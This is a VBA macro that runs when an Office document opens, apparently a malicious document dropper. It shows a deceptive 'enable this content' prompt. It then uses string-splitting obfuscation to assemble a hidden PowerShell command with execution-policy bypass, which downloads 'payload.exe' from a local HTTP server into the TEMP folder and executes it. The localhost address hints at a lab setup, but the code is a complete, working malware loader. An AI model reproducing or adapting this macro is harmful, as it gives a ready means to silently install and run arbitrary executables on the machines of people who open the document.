Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If MsgBox("Do you want to enable this content?", vbYesNo) <> vbYes Then
        Exit Sub
    End If
    Dim cmd As String
    Dim objShell As Object
    Dim url As String, outPath As String
    url = "http:/" & "/127" & ".0.0" & ".1:9090/p" & "ayload.e" & "xe"
    outPath = Environ("TEMP") & "\oblivion" & "x_pay" & "load.exe"
    cmd = "powe" & "rshell" & ".exe -N" & "oProfil" & "e -Windo" & "wStyle Hi" & "dden" & " " & _
          "-Execu" & "tionPoli" & "cy Byp" & "ass -Comm" & "and " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & url & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set objShell = CreateObject("WScript." & "Shell")
    objShell.Run cmd, 0, False
End Sub
